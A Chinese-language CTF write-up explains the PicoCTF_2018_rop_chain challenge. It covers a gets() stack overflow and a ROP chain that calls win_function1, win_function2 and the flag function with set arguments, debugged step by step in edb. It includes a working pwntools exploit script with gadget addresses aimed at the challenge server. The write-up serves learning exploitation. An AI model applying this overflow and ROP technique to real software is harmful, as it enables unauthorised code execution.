在CTF
PWN的题型中有一种利用方式是ROP，原理学明白了，但是实操起来一直不太理解ROP链的具体构造，为了弄明白原理，就找了一道入门题目，对照着wp进行单步调试，来理解ROP链的构造。

题目：buuctf，PicoCTF_2018_rop_chain

拿到题目，对主函数进行分析，局部变量s开辟了18h大小空间，但是gets函数在接收数据的时候没有限制长度，会导致栈溢出。

![1682391946_6447438ab7c1975ae2cfa.png!small](https://image.3001.net/images/20230425/1682391946_6447438ab7c1975ae2cfa.png!small)

需要控制函数返回地址跳转到后门函数获取flag，但是有前提条件，win1和win2全局变量不能为0，而且a1参数要等于0DEADBAADh，a1参数可以通过栈溢出控制栈中参数的值，win1和win2则需要调用另外两个内置函数来进行赋值，这时就需要构造ROP链，1调用win_function1修改win1的值，2调用win_function2修改win2的值，3调用后门函数。​

![1682391965_6447439d8c289f737cb37.png!small](https://image.3001.net/images/20230425/1682391965_6447439d8c289f737cb37.png!small)

win_fucntion1函数直接可以为win1赋值。

![1682391918_6447436e6cb78e5f09a32.png!small](https://image.3001.net/images/20230425/1682391918_6447436e6cb78e5f09a32.png!small)

win_function2函数想要为win2赋值，还需要将参数设置为0xBAAAAAAD。

![1682425334_6447c5f62e412017f0570.png!small](https://image.3001.net/images/20230425/1682425334_6447c5f62e412017f0570.png!small)

这里直接把wp的payload抄来，单步调试来理解ROP的原理。

payload = fill + win_fucntion1 + win_function2 + win2_arg + pop_ebp_ret +
flag_function + flag_arg + pop_ebp_ret  
---  
  
exp如下：

    
    
    from pwn import *
    #p = process("./PicoCTF_2018_rop_chain")
    p = remote("node4.buuoj.cn","26202")
    pop_ebp_ret = 0x080485d6
    print(p32(0x080485CB))
    payload = b"a"*24 + b"a"*4 + p32(0x080485CB) + p32(0x080485D8) + p32(pop_ebp_ret) + p32(0x0BAAAAAAD) + p32(0x0804862B) + p32(pop_ebp_ret) + p32(0x0DEADBAAD)
    p.sendafter("Enter your input> ",payload)
    p.interactive()

重点看一下payload在内存中的变化，一开始不理解为什么要加pop_ebp_ret，通过内存调试来解决自己的困惑。

gdb是linux上老牌调试工具，大部分逆向工作者的首选调试器，我个人更喜欢edb，是个图形化的调试工具，界面布局和操作和windows上的ollydbg很像，操作起来更加直观，对于我这种老ollydbg用户来说是非常友好的。

来到08048731地址处，设置断点，然后在内存堆栈中手动修改为payload。

![1682425453_6447c66d089889a79e9ec.png!small](https://image.3001.net/images/20230425/1682425453_6447c66d089889a79e9ec.png!small)

单步调试，观察内存中栈的变化，运行到ret指令，观察到ebp被pop成为了我们填充的aaaa，此时栈顶指针为我们覆盖的返回地址，此地址为win_function1的地址，该函数不需要参数。

![1682425515_6447c6ab0795da041b6ed.png!small](https://image.3001.net/images/20230425/1682425515_6447c6ab0795da041b6ed.png!small)

执行ret后，函数就跳转到了win_function1中，ret会让栈发生变化，esp+4，这时栈顶位置就是win_function1执行完成后要跳转的返回地址，也就是下一个函数win2_function2函数的地址。

![1682422131_6447b973282d3f0e99aff.png!small](https://image.3001.net/images/20230425/1682422131_6447b973282d3f0e99aff.png!small)

执行完win_fucntion1函数后，就会跳转到win_function2，根据payload分析，此时esp栈顶位置是ret的返回地址，这里返回到pop_ebp_ret的地方，esp+4的位置是win_function2的参数，esp+8位置是下一个要跳转到的函数位置vuln函数。

![1682422546_6447bb12a9ce1fd85de43.png!small](https://image.3001.net/images/20230425/1682422546_6447bb12a9ce1fd85de43.png!small)

​pop_ebp_ret的地址是通过ROPGadget获取到的pop ebp; ret汇编代码地址。

![1682425605_6447c70583220c98d2b61.png!small](https://image.3001.net/images/20230425/1682425605_6447c70583220c98d2b61.png!small)

win_function2为什么要返回到pop_ebp_ret，这里困扰我一直不能理解，单步跟踪后发现，原因是此函数有参数，当前函数执行ret后，此时栈顶是win_function2的参数，需要执行pop
ebp将栈顶弹出，让栈顶指针指向vuln函数的地址，在利用ret跳转到到vuln函数，这就是pop
ebp​；ret的作用​。如果是传两个参数，那就需要pop两次再ret，需要注意的是pop会改变寄存器的值，执行完pop操作后​是否会影响到函数的正常运行。

``

![1682423480_6447beb81048a527a2356.png!small](https://image.3001.net/images/20230425/1682423480_6447beb81048a527a2356.png!small)

vuln函数同上，需要传递参数，此时栈结构应为pop_ebp_ret + arg1。

![1682425676_6447c74ce01b8b883d9cb.png!small](https://image.3001.net/images/20230425/1682425676_6447c74ce01b8b883d9cb.png!small)

至此成功pwn​。

![1682424193_6447c18194ce24849ee41.png!small](https://image.3001.net/images/20230425/1682424193_6447c18194ce24849ee41.png!small)

